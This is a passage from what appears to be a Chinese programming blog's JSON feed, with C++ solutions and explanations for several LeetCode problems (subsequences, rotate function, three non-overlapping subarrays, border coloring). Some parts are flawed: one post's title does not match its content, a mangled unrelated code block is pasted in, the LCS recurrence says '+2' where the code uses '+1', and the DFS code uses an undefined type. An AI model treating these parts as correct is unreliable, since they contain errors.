data-src=\"/../../../post_images/%E7%BB%99%E6%A4%8D%E7%89%A9%E6%B5%87%E6%B0%B4II_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%853.png\"></p>\n<p><img data-src=\"/../../../post_images/%E7%BB%99%E6%A4%8D%E7%89%A9%E6%B5%87%E6%B0%B4II_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%854.png\"></p>\n<h2 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2><p>我的思路: 题目中要求求重新灌满水的次数，由题可知，两人浇水过程的位置是对称的， 所以说浇完后两人的次数要么相等要么相差<code>1</code> ，那么每一位置的浇水量必然不大于该人的水罐容量，也就不需要考虑某人浇不了水要等另一个人浇 (这样就明显变为另一个题目了)</p>\n<p>(或许可以有这样的题目: “如果两人分别从两边开始浇水，若可以浇水，则浇，若水量不够则重新灌水，若还是不够，则选择原地等待，等另一个人浇。请返回以下值，若可以全浇完，返回重新灌水次数，若不行，返回-1”)</p>\n<p>接上面思路：</p>\n<p>这样我们可以知道，每个人浇水次数至少是植物数整除2的结果，所以我们可以用循环循环这一次数，结束时，根据提示，<code>plants[i]&gt;0</code>，所以可在浇完水后将浇完水的植物<code>plant[i]</code>赋值<code>0</code>，最后只需判断最中间</p>\n<p>的<code>plants[i]</code>是否为<code>0</code>，若不为<code>0</code>，则还需再浇一次，因此判断两人剩余量的最大值是否可行，不可行则灌水次数加一</p>\n<p>据上面分析，我们所需要的变量为：<code>curA</code>记录Alice剩余水量，<code>curB</code>记录<code>Bob</code>剩余水量，<code>ans</code>记录总灌水次数，<code>time</code>记录最少浇水次数</p>\n<p>以下为代码:</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int minimumRefill(vector&lt;int&gt;&amp; plants, int capacityA, int capacityB) {\n        int times=plants.size()/2;\n        int curA=capacityA,curB=capacityB;\n        int ans=0;\n        for(int i=0;i&lt;times;i++)\n        {\n            if(curA&gt;=plants[i])\n            {\n                curA-=plants[i];\n                plants[i]=0;\n            }\n            else\n            {\n                ans++;\n                curA=capacityA-plants[i];\n                plants[i]=0;\n            }\n            if(curB&gt;=plants[plants.size()-1-i])\n            {\n                curB-=plants[plants.size()-1-i];\n                plants[plants.size()-1-i]=0;\n            }\n            else\n            {\n                ans++;\n                curB=capacityB-plants[plants.size()-1-i];\n                plants[plants.size()-1-i]=0;\n            }\n        }\n        if(plants[times])\n        {\n            if(max(curA,curB)&lt;plants[times])\n            ans++;\n        }\n        return ans;\n    }\n};\n</code></pre>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int minimumRefill(vector&lt;int&gt;&amp; plants, int capacityA, int capacityB) {\n        int n = plants.size(), ans = 0, a = capacityA, b = capacityB;\n        for (int i = 0, j = n - 1; i &lt; j; ++i, --j) {\n            if (a &lt; plants[i]) a = capacityA, ++ans;\n            a -= plants[i];\n            if (b &lt; plants[j]) b = capacityB, ++ans;\n            b -= plants[j];\n        }\n        if (n &amp; 1 &amp;&amp; max(a, b) &lt; plants[n / 2]) ++ans;\n        return ans;\n    }\n};\n</code></pre>\n<h2 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2><h1 id=\"摘水果\"><a href=\"#摘水果\" class=\"headerlink\" title=\"摘水果\"></a>摘水果</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbWF4aW11bS1mcnVpdHMtaGFydmVzdGVkLWFmdGVyLWF0LW1vc3Qtay1zdGVwcy8=\">摘水果</span></p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int maxTotalFruits(vector&lt;vector&lt;int&gt;&gt;&amp; fruits, int startPos, int k) {\n        int n = fruits.size();\n        \n        // 前缀和，用于求区间 [l, r] 共有多少水果\n        vector&lt;int&gt; sum;\n        sum.push_back(0);\n        for (int i = 1; i &lt;= n; ++ i)\n            sum.push_back(fruits[i - 1][1] + sum[i - 1]);\n\n        vector&lt;int&gt; pos;\n        for (int i = 0; i &lt; n; ++ i)\n            pos.push_back(fruits[i][0]);\n\n        // 枚举可能抵达的区间\n        int ans = 0;\n        for (int x = k; x &gt;= 0; -- x)\n        {\n            int y = (k - x) / 2;\n            int l, r;\n            // x + 2y = k\n            l = startPos - x, r = startPos + y;\n            auto pl = lower_bound(pos.begin(), pos.end(), l) - pos.begin(), pr = upper_bound(pos.begin(), pos.end(), r) - pos.begin();\n            ans = max(ans, sum[pr] - sum[pl]);\n            // 2y + x = k\n            l = startPos - y, r = startPos + x;\n            pl = lower_bound(pos.begin(), pos.end(), l) - pos.begin(), pr = upper_bound(pos.begin(), pos.end(), r) - pos.begin();\n            ans = max(ans, sum[pr] - sum[pl]);\n        }\n        \n        return ans;\n    }\n};\n</code></pre>\n",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/9e6e8fdc/",
            "url": "http://dpm12345.cn/posts/9e6e8fdc/",
            "title": "子序列问题",
            "date_published": "2021-12-09T01:54:40.000Z",
            "content_html": "<h1 id=\"最长公共子序列\"><a href=\"#最长公共子序列\" class=\"headerlink\" title=\"最长公共子序列\"></a>最长公共子序列</h1><p>题目链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbG9uZ2VzdC1jb21tb24tc3Vic2VxdWVuY2Uv\">最长公共子序列</span></p>\n<p>题目详情:</p>\n<p><img data-src=\"/../../../post_images/%E5%AD%90%E5%BA%8F%E5%88%97%E9%97%AE%E9%A2%98_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%851.png\"></p>\n<p><img data-src=\"/../../../post_images/%E5%AD%90%E5%BA%8F%E5%88%97%E9%97%AE%E9%A2%98_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%852.png\"></p>\n<h2 id=\"动态规划\"><a href=\"#动态规划\" class=\"headerlink\" title=\"动态规划\"></a>动态规划</h2><p>我们可以用$dp [i][j]$表示字符串1$[0<del>i]$范围内和字符串2$ [0</del>i]$范围内的最长公共序列</p>\n<p>当$text1[i]=text2[j]$时，很明显 $dp [i][j]=dp [i-1][j-1]+2$</p>\n<p>当$text1[i]!=text2[j]$时，$dp[i][j]=max(dp[i][j-1],dp[i-1][j])$</p>\n<p>因为此时需要找个最长的子序列为然后连接上后面未知的字符，这样遍历到最后就能得到最大</p>\n<p>以下为代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int longestCommonSubsequence(string text1, string text2) {\n        int m=text1.length(),n=text2.length();\n        vector&lt;vector&lt;int&gt;&gt;dp(m+1,vector&lt;int&gt;(n+1));\n        int ans=0;\n        for(int i=1;i&lt;=m;i++)\n        {\n            for(int j=1;j&lt;=n;j++)\n            {\n                if(text1[i-1]==text2[j-1])\n                    dp[i][j]=dp[i-1][j-1]+1;\n                else\n                    dp[i][j]=max(dp[i-1][j],dp[i][j-1]);\n                ans=max(ans,dp[i][j]);\n            }\n        }\n        return ans;\n    }\n};\n</code></pre>\n<h1 id=\"最长回文子序列\"><a href=\"#最长回文子序列\" class=\"headerlink\" title=\"最长回文子序列\"></a>最长回文子序列</h1><p>题目链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9sb25nZXN0LXBhbGluZHJvbWljLXN1YnNlcXVlbmNlL3N1Ym1pc3Npb25zLw==\">最长回文子序列</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E5%BA%8F%E5%88%97.jpg\"></p>\n<h2 id=\"解法一\"><a href=\"#解法一\" class=\"headerlink\" title=\"解法一\"></a>解法一</h2><p>沿用求最长公共子序列的方法，我们可以先将字符串反转，得到一个新的字符串，再求这两个字符串的最长公共子序列的值，即为最长回文子序列</p>\n<p><strong>证明：</strong> 回文串的表现为成对称分布，从前往后遍历和从后往前遍历的结果是一样的，所以说如果求其与其本身的反转字符串的最长公共子序列，因为一个是正向，一个是反向，当求的该共同字符串时，那就说明该字符子序列在原字符串中为回文子序列，又由于在求解过程中记录的为最长，那么结果就能得到最长回文子序列</p>\n<p>下面为代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int longestPalindromeSubseq(string s) {\n        string re=s;\n        int ans=0;\n        reverse(re.begin(),re.end());\n        vector&lt;vector&lt;int&gt;&gt;dp(s.length()+1,vector&lt;int&gt;(s.length()+1));\n        for(int i=1;i&lt;=s.length();i++)\n        {\n            for(int j=1;j&lt;=re.length();j++)\n            {\n                if(s[i-1]==re[j-1])\n                    dp[i][j]=dp[i-1][j-1]+1;\n                else\n                    dp[i][j]=max(dp[i-1][j],dp[i][j-1]);\n                ans=max(ans,dp[i][j]);\n            }\n        }\n        return ans;\n\n    }\n};\n</code></pre>\n<h2 id=\"解法二\"><a href=\"#解法二\" class=\"headerlink\" title=\"解法二\"></a>解法二</h2><p>根据回文串的特征，如果一段字符串是回文串，那么将其两边各删去一个字符后依然为回文串，所以我们可以用$dp[i][j]$来表示$i$到$j$最长回文子序列的长度，当遍历时，如果$s[i]=s[j]$，那么$dp[i]=dp[i+1][j-1]+2$，如果不相等，$dp[i][j]=max(dp[i+1][j],dp[i][j-1]$</p>\n<p>需要注意的是，回文串最短为其本身，所以在开始真正寻找前，可以先将$dp [i][i]=1$</p>\n<p>在这里，我们选择由后至前推导，根据上方思想，那么最后的值应为$dp [0][n-1]$($n$为字符串长度)</p>\n<p>下面为代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int longestPalindromeSubseq(string s) {\n        int n=s.length();\n        vector&lt;vector&lt;int&gt;&gt;dp(n,vector&lt;int&gt;(n));\n        for(int i=n-1;i&gt;=0;i--)\n        {\n            dp[i][i]=1;\n            for(int j=i+1;j&lt;n;j++)\n            {\n                if(s[j]==s[i])\n                    dp[i][j]=dp[i+1][j-1]+2;\n                else\n                    dp[i][j]=max(dp[i+1][j],dp[i][j-1]);\n            }\n        }\n        return dp[0][n-1];\n    }\n};\n</code></pre>\n",
            "tags": [
                "动态规划",
                "子序列",
                "最长公共子序列",
                "最长回文子序列"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/ca7417e/",
            "url": "http://dpm12345.cn/posts/ca7417e/",
            "title": "三个无重叠子数组的最大和",
            "date_published": "2021-12-09T01:54:40.000Z",
            "content_html": "<p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvcm90YXRlLWZ1bmN0aW9uLw==\">旋转函数</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E6%97%8B%E8%BD%AC%E5%87%BD%E6%95%B0.jpg\"></p>\n<p>解题思路:</p>\n<p>由题目中的旋转函数形式<br>$$<br>F(k) = 0 * B_k[0] + 1 * B_k[1] + … + (n-1) * B_k[n-1]<br>$$<br>以题目示例为例</p>\n<blockquote>\n<p>A = [4, 3, 2, 6]</p>\n</blockquote>\n<blockquote>\n<p>F(0) = (0 * 4) + (1 * 3) + (2 * 2) + (3 * 6) = 0 + 3 + 4 + 18 = 25 </p>\n<p>F(1) = (0 * 6) + (1 * 4) + (2 * 3) + (3 * 2) = 0 + 4 + 6 + 6 = 16 F(2) = (0 * 2) + (1 * 6) + (2 * 4) + (3 * 3) = 0 + 6 + 8 + 9 = 23 F(3) = (0 * 3) + (1 * 2) + (2 * 6) + (3 * 4) = 0 + 2 + 12 + 12 = 26</p>\n</blockquote>\n<p>即<br>$$<br>F(0) = (0 * A [0]) + (1 * A [1]) + (2 * A [2]) + (3 * A [3])<br>$$</p>\n<p>$$<br>F(1) = (0 * A[3]) + (1 * A[0]) + (2 * A[1]) + (3 * A[2])<br>$$</p>\n<p>$$<br>F(2) = (0 * A[2]) + (1 * A[3]) + (2 * A[0]) + (3 * A[1])<br>$$</p>\n<p>$$<br>F(3) = (0 * A[1]) + (1 * A[2]) + (2 * A[3]) + (3 * A[0])<br>$$</p>\n<p>将相邻两个函数相减，可以发现<br>$$<br>F(1)-F(0)=A[0]+A[1]+A[2]+A[3]-4*A[3]<br>$$</p>\n<p>$$<br>F(2)-F(1)=A[0]+A[1]+A[2]+A[3]-4*A[2]<br>$$</p>\n<p>$$<br>F(3)-F(2)=A[0]+A[1]+A[2]+A[3]-4*A[1]<br>$$</p>\n<p>那么可以发现一般规律<br>$$<br>F(k)-F(k-1)=A[0]+A[1]+A[2]+A[3]+···+A[n-1]-n<em>A[n-k];<br>$$<br>形式为数组A元素之和减去$n</em>A[n-k]$</p>\n<p>由此我们可以维护一个$dp$数组，$dp[i]$表示$F(k)$; 一个$sum$表示$A$的元素之和。<br>$$<br>dp[i]=dp[i-1]+sum-n*A[n-i];<br>$$<br>特别的，当$i=0$时，$dp[i]=sum$。</p>\n<p>最后输出$dp[i]$的最大值</p>\n<p>因此，代码如下</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int maxRotateFunction(vector&lt;int&gt;&amp; nums) {\n        int n=nums.size();\n        int sum=0;\n        vector&lt;int&gt;dp(n);\n        for(int i=0;i&lt;n;i++)\n        {\n            sum+=nums[i];\n            dp[0]+=i*nums[i];\n        }\n        for(int i=1;i&lt;n;i++)\n        {\n            dp[i]=dp[i-1]+sum-n*nums[n-i];\n        }\n        return *max_element(dp.begin(),dp.end());\n    }\n};\n</code></pre>\n",
            "tags": [
                "动态规划"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/ca7417e/",
            "url": "http://dpm12345.cn/posts/ca7417e/",
            "title": "三个无重叠子数组的最大和",
            "date_published": "2021-12-08T01:54:40.000Z",
            "content_html": "<p>题目链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbWF4aW11bS1zdW0tb2YtMy1ub24tb3ZlcmxhcHBpbmctc3ViYXJyYXlzLw==\"> 三个无重叠子数组的最大和</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E4%B8%89%E4%B8%AA%E6%97%A0%E9%87%8D%E5%8F%A0%E5%AD%90%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%A4%A7%E5%92%8C.jpg\"></p>\n<p>该题为 2021-12-8 的每日一题，可解决该问题的方法涉及到前缀和，动态规划，滑动窗口知识</p>\n<p>思路: 题目要求求出某一数组三个长度为 k 的无重叠数组，使它们的元素之和为最大。</p>\n<p>看到这个个数为 k，很容易想到滑动窗口这一算法，只是在这里，需要同时存在三个滑动窗口，</p>\n<p>同样的，在这题，也可以用动态规划进行解决</p>\n<p>下面是我自己在解题时的过程</p>\n<h1 id=\"动态规划（劣质版）\"><a href=\"#动态规划（劣质版）\" class=\"headerlink\" title=\"动态规划（劣质版）\"></a>动态规划（劣质版）</h1><p>刚拿到题目时，我能想到，该题可以使用动态规划解决，但并无方向该从哪个地方下手将什么作为$dp[i]$所表达的意义，</p>\n<p>思考了大约20分钟后，我还是无从下手，于是打开了题解，第一眼看到的是”单个子数组的最大和“，顿时恍然大悟，我可以将不同个数的子数组作为一个$dp$，在计算个数加一时，便可以利用前面的$dp$，得到最优解。仔细思考，该方案的时间复杂度为$O(n)$。</p>\n<p>在以下的代码中，我是如此考虑的：</p>\n<p>先用$sum[i]$计算前缀和，为后续计算提供便利再分别使用$dp1$，$dp2$，$dp3$记录不同个数的子数组元素的最大值，其转移方程分别为：<br>$$<br>dp1[i]=max{dp1[i-1],sum[i+1]-sum[i-k+1]}<br>$$</p>\n<p>$$<br>dp2[i]=max{dp2[i-1],dp1[i-k]+sum[i+1]-sum[i-k+1]}<br>$$</p>\n<p>$$<br>dp3[i]=max{dp3[i-1],dp2[i-k]+sum[i+1]-sum[i-k+1]}<br>$$</p>\n<p>但这样并不能记录下标输出答案，所以这里我采用了，三个flag数组，用于记录下标，具体见代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    vector&lt;int&gt; maxSumOfThreeSubarrays(vector&lt;int&gt;&amp; nums, int k) {\n        int n=nums.size();\n        vector&lt;int&gt;dp1(n),dp2(n),dp3(n);\n        vector&lt;int&gt;flag1(n);\n        vector&lt;pair&lt;int,int&gt;&gt;flag2(n);\n        vector&lt;pair&lt;int,int&gt;&gt;flag3(n);\n        vector&lt;int&gt;sum(n+1,0);\n        vector&lt;int&gt;ans;\n        for(int i=0;i&lt;n;i++)\n        {\n            sum[i+1]+=nums[i]+sum[i];           \n        }\n        for(int i=k-1;i&lt;n;i++)\n        {\n            dp1[i]=max(dp1[i-1],sum[i+1]-sum[i-k+1]);\n            if(dp1[i]==dp1[i-1])\n            {\n                flag1[i]=flag1[i-1];\n            }\n            else\n            {\n                flag1[i]=i-k+1;\n            }\n        }\n        for(int i=2*k-1;i&lt;n;i++)\n        {\n            dp2[i]=max(dp2[i-1],dp1[i-k]+sum[i+1]-sum[i-k+1]);\n            if(dp2[i]==dp2[i-1])\n            {\n                flag2[i]=flag2[i-1];\n            }\n            else\n            {\n                flag2[i]={flag1[i-k],i-k+1};\n            }\n        }\n        for(int i=3*k-1;i&lt;n;i++)\n        {\n            dp3[i]=max(dp3[i-1],dp2[i-k]+sum[i+1]-sum[i-k+1]);\n            if(dp3[i]==dp3[i-1])\n            {\n                flag3[i]=flag3[i-1];\n            }\n            else\n            {\n                flag3[i]={flag2[i-k].second,i-k+1};\n            }\n        }\n        return {flag2[flag3[n-1].first].first,flag3[n-1].first,flag3[n-1].second};\n    }\n};\n</code></pre>\n<p>xxxxxxxxxx&nbsp;class Solution {public: &nbsp; &nbsp;int maxResult(vector<int>&amp; nums, int k) { &nbsp; &nbsp; &nbsp; &nbsp;int n = nums.size(); &nbsp; &nbsp; &nbsp; &nbsp;vector<int> dp(n); &nbsp; &nbsp; &nbsp; &nbsp;dp[0] = nums[0]; &nbsp; &nbsp; &nbsp; &nbsp;priority_queue&lt;pair&lt;int, int&gt;&gt; q; &nbsp; &nbsp; &nbsp; &nbsp;q.emplace(nums[0], 0); &nbsp; &nbsp; &nbsp; &nbsp;for (int i = 1; i &lt; n; ++i) { &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;while (i - q.top().second &gt; k) { &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;q.pop(); &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  } &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dp[i] = q.top().first + nums[i]; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;q.emplace(dp[i], i); &nbsp; &nbsp; &nbsp;  } &nbsp; &nbsp; &nbsp; &nbsp;return dp[n - 1]; &nbsp;  }};cpp 优先级队列2</int></int></p>\n<p><img data-src=\"/../../../post_images/%E6%89%A7%E8%A1%8C%E9%94%99%E8%AF%AF.png\"></p>\n<p>观察报错信息，可知，在我的代码中，并未考虑<code>k==1</code>的情况，因为代码中我是通过<code>for(int i=k-1;i&lt;n;i++)</code>实现循环的，k-1 就会为 0，至于后面 i-1 造成错误</p>\n<p>改进代码:</p>\n<pre><code class=\"cpp\">if(k==1)                      // 考虑 k==1 的情况\n    {\n        vector&lt;int&gt;ans(3);\n        for(int i=0;i&lt;3;i++)\n        {\n            ans[i]=max_element(nums.begin(),nums.end())-nums.begin();\n                *max_element(nums.begin(),nums.end())=0;\n        }\n        sort(ans.begin(),ans.end());\n        return ans;\n    }\n</code></pre>\n<p>再次提交，发现答案出错，如下:</p>\n<p><img data-src=\"/../../../post_images/%E4%B8%89%E4%B8%AA%E6%97%A0%E9%87%8D%E5%8F%A0.png\"></p>\n<p>在这并不能看出什么，为此，我进行了多组数据的尝试，发现第一个大部分都不符合答案，但后两个一直都是正确的，说明<code>flag1</code>求解过程无误，而是输出出错</p>\n<p>对此，进行代码分析，最后输出时，我写的是</p>\n<p><code>return {flag2[flag3[n-1].first].first,flag3[n-1].first,flag3[n-1].second};</code></p>\n<p><code>[flag2[flag3[n-1].first].first</code>，因为我在<code>flag3.first</code>存入的是<code>flag2</code>的索引的第二个元素，以此来得到<code>flag1</code>明显是不可行的，因为对应<code>flag1</code>的下标与<code>flag2</code>的第二个元素并无关系，<code>flag1[i-k]</code>可能是前一个继承来的，与<code>flag2</code>的第二个元素无关，也有可能与其有关，总之该方法不一定正确</p>\n<p>那么我做以下修改</p>\n<ol>\n<li>重新定义<code>flag3</code>数组类型，为<code>&lt;pair&lt;pair&lt;int,int&gt;，int&gt;&gt;</code></li>\n<li>存入<code>flag3</code>时存入<code>{flag2 [i-k],i-k+1}</code></li>\n<li>读取第一个使用<code>flag3[n-1].first.first</code>，第二个使用<code>flag3[n-1].first.second</code></li>\n</ol>\n<p>以下为修改后的代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    vector&lt;int&gt; maxSumOfThreeSubarrays(vector&lt;int&gt;&amp; nums, int k) {\n        int n=nums.size();\n        if(k==1)                      // 考虑 k==1 的情况\n        {\n            vector&lt;int&gt;ans(3);\n            for(int i=0;i&lt;3;i++)\n            {\n                ans[i]=max_element(nums.begin(),nums.end())-nums.begin();\n                *max_element(nums.begin(),nums.end())=0;\n            }\n            sort(ans.begin(),ans.end());\n            return ans;\n        }\n        //dp [i] 表示 0 到该位置所能得到的 x 个无重叠数组和的最大值\n        vector&lt;int&gt;dp1(n),dp2(n),dp3(n);\n        \n        //flag1 记录某一位置 1 个最大无重叠数组的下标       \n        vector&lt;int&gt;flag1(n);\n        \n        //flag2 记录某一位置 2 个最大无重叠数组的下标    \n        vector&lt;pair&lt;int,int&gt;&gt;flag2(n);\n        \n        //flag3 记录某一位置 3 个最大无重叠数组的下标                  \n        vector&lt;pair&lt;pair&lt;int,int&gt;,int&gt;&gt;flag3(n);              \n        \n        //sum [i] 表示前 i 个数之和\n        vector&lt;int&gt;sum(n+1,0); \n        \n        for(int i=0;i&lt;n;i++)                       // 计算前缀和\n        {\n            sum[i+1]+=nums[i]+sum[i];           \n        }\n        \n        // 计算从 k-1 开始 1 个无重叠子数组最大的值，用 flag1 记录下标值\n        for(int i=k-1;i&lt;n;i++)                      \n        {\n            dp1[i]=max(dp1[i-1],sum[i+1]-sum[i-k+1]);\n            if(dp1[i]==dp1[i-1])\n            {\n                flag1[i]=flag1[i-1];\n            }\n            else\n            {\n                flag1[i]=i-k+1;\n            }\n        }\n        \n        // 计算从 2*k-1 开始 2 个无重叠子数组最大的值，用 flag2 记录下标值\n        for(int i=2*k-1;i&lt;n;i++)                   \n        {\n            dp2[i]=max(dp2[i-1],dp1[i-k]+sum[i+1]-sum[i-k+1]);\n            if(dp2[i]==dp2[i-1])\n            {\n                flag2[i]=flag2[i-1];\n            }\n            else\n            {\n                flag2[i]={flag1[i-k],i-k+1};\n            }\n        }\n        \n        // 计算从 3*k-1 位置开始 3 个无重叠子数组最大的值，用 flag2 记录下标值\n        for(int i=3*k-1;i&lt;n;i++)                        \n        { \n            dp3[i]=max(dp3[i-1],dp2[i-k]+sum[i+1]-sum[i-k+1]);\n            if(dp3[i]==dp3[i-1])\n            {\n                flag3[i]=flag3[i-1];\n            }\n            else\n            {\n                flag3[i]={flag2[i-k],i-k+1};\n            }\n        }\n        \n        // 根据 flag3 找寻下标\n        return {flag3[n-1].first.first,flag3[n-1].first.second,flag3[n-1].second};   \n    }\n};\n</code></pre>\n<h1 id=\"滑动窗口\"><a href=\"#滑动窗口\" class=\"headerlink\" title=\"滑动窗口\"></a>滑动窗口</h1><p>维护<code>sum1</code>，<code>sum2</code>，<code>sum3</code>，分别表示<code>n</code>个子数组的最大值，若大于原来的更新下标(代码中为<code>sum1maxid,sum2maxid1,sum2maxid2</code>) 当数组个数大于等于k时，那么需删去首个元素，更新窗口</p>\n<p>以下为代码实现</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    vector&lt;int&gt; maxSumOfThreeSubarrays(vector&lt;int&gt;&amp; nums, int k) {\n        int n=nums.size();\n        int sum1=0,sum2=0,sum3=0;\n        int sum1max=0,sum2max=0,sum3max=0;\n        int sum1maxid,sum2maxid1,sum2maxid2;\n        vector&lt;int&gt;ans;\n        for(int i=2*k;i&lt;n;i++)\n        {\n            sum1+=nums[i-2*k];\n            sum2+=nums[i-k];\n            sum3+=nums[i];\n            if(i&gt;=3*k-1)\n            {\n                if(sum1&gt;sum1max)\n                {\n                    sum1max=sum1;\n                    sum1maxid=i-3*k+1;          // 更新 1 个子数组最大值下标\n                }\n                if(sum1max+sum2&gt;sum2max)\n                {\n                    sum2max=sum1max+sum2;\n                    sum2maxid1=sum1maxid;       // 更新两个子数组中 1 个子数组最大值下标\n                    sum2maxid2=i-2*k+1;         // 更新 1 个子数组最大值下标\n                }\n                if(sum2max+sum3&gt;sum3max)\n                {\n                    sum3max=sum2max+sum3;\n                    ans={sum2maxid1,sum2maxid2,i-k+1};  // 更新答案\n                }\n                sum1-=nums[i-3*k+1];             // 删去首个\n                sum2-=nums[i-2*k+1];             // 删去首个\n                sum3-=nums[i-k+1];               // 删去首个\n            }\n        }\n        return ans;\n    }\n};\n</code></pre>\n",
            "tags": [
                "前缀和",
                "动态规划",
                "滑动窗口"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/65c00a51/",
            "url": "http://dpm12345.cn/posts/65c00a51/",
            "title": "边界着色 岛屿数量",
            "date_published": "2021-12-07T07:54:40.000Z",
            "content_html": "<h1 id=\"边界着色\"><a href=\"#边界着色\" class=\"headerlink\" title=\"边界着色\"></a>边界着色</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvY29sb3JpbmctYS1ib3JkZXIv\">边界着色</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E8%BE%B9%E7%95%8C%E7%9D%80%E8%89%B2.jpg\"></p>\n<p>思路：与 200.岛屿数量题相类似，可以使用深度优先搜索或广度优先搜索进行解题。先找出满足连通分量的位置，再判断是否为边界</p>\n<h2 id=\"深度优先搜索\"><a href=\"#深度优先搜索\" class=\"headerlink\" title=\"深度优先搜索\"></a>深度优先搜索</h2><p><strong>以下为代码</strong></p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    vector&lt;vector&lt;int&gt;&gt; colorBorder(vector&lt;vector&lt;int&gt;&gt;&amp; grid, int row, int col, int color) {\n        int m = grid.size(), n = grid[0].size();\n        vector&lt;vector&lt;bool&gt;&gt; visited(m, vector&lt;bool&gt;(n, false));\n        vector&lt;pair&lt;int, int&gt;&gt; borders;\n        int originalColor = grid[row][col];\n        visited[row][col] = true;\n        dfs(grid, row, col, visited, borders, originalColor);\n        for (auto &amp; [x, y] : borders) {\n            grid[x][y] = color;\n        }\n        return grid;\n    }\n\n    void dfs(vector&lt;vector&lt;int&gt;&gt;&amp; grid, int x, int y, vector&lt;vector&lt;bool&gt;&gt; &amp; visited, vector&lt;pii&gt; &amp; borders, int originalColor) {\n        int m = grid.size(), n = grid[0].size();\n        bool isBorder = false;\n        int direc[4][2] = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}};\n        for (int i = 0; i &lt; 4; i++) {\n            int nx = direc[i][0] + x, ny = direc[i][1] + y;\n            if (!(nx &gt;= 0 &amp;&amp; nx &lt; m &amp;&amp; ny &gt;= 0 &amp;&amp; ny &lt; n &amp;&amp; grid[nx][ny] == originalColor)) {\n                isBorder = true;\n            } else if (!visited[nx][ny]) {\n                visited[nx][ny] = true;\n                dfs(grid, nx, ny, visited, borders, originalColor);\n            }                \n        }\n        if (isBorder) {\n            borders.emplace_back(x, y);\n        }\n    }\n};\n</code></pre>\n<h2 id=\"广度优先搜索\"><a href=\"#广度优先搜索\" class=\"headerlink\" title=\"广度优先搜索\"></a>广度优先搜索</h2><pre><code class=\"cpp\">class Solution {\npublic:\n    vector&lt;vector&lt;int&gt;&gt; colorBorder(vector&lt;vector&lt;int&gt;&gt;&amp; grid, int row, int col, int color) {\n        int m = grid.size(), n = grid[0].size();\n        vector&lt;vector&lt;bool&gt;&gt; visited(m, vector&lt;bool&gt;(n, false));\n        vector&lt;pair&lt;int, int&gt;&gt; borders;\n        int originalColor = grid[row][col];\n        int direc[4][2] = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}};\n        queue&lt;pair&lt;int, int&gt;&gt; q;\n        q.emplace(row, col);\n        visited[row][col] = true;\n        while (!q.empty()) {\n            pair&lt;int, int&gt; &amp; node = q.front();\n            q.pop();\n            int x = node.first, y = node.second;\n\n            bool isBorder = false;\n            for (int i = 0; i &lt; 4; i++) {\n                int nx = direc[i][0] + x, ny = direc[i][1] + y;\n                if (!(nx &gt;= 0 &amp;&amp; nx &lt; m &amp;&amp; ny &gt;= 0 &amp;&amp; ny &lt; n &amp;&amp; grid[nx][ny] == originalColor)) {\n                    isBorder = true;\n                } else if (!visited[nx][ny]) {\n                    visited[nx][ny] = true;\n                    q.emplace(nx, ny);\n                }         \n            }\n            if (isBorder) {\n                borders.emplace_back(x, y);\n            }\n        }\n        for (auto &amp; [x, y] : borders) {\n            grid[x][y] = color;\n        }\n        return grid;\n    }\n};\n</code></pre>\n<h1 id=\"岛屿数量\"><a href=\"#岛屿数量\" class=\"headerlink\" title=\"岛屿数量\"></a>岛屿数量</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbnVtYmVyLW9mLWlzbGFuZHMv\">岛屿数量</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E5%B2%9B%E5%B1%BF%E6%95%B0%E9%87%8F.png\"></p>\n<h2 id=\"深度优先搜索-1\"><a href=\"#深度优先搜索-1\" 